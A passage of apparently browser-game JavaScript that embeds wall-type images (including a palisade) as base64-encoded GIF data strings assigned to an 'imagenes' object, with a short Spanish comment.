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';
	// Imagenes de los tipos de murallas
	imagenes["empalizada"] = 'data:image/gif;base64,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';
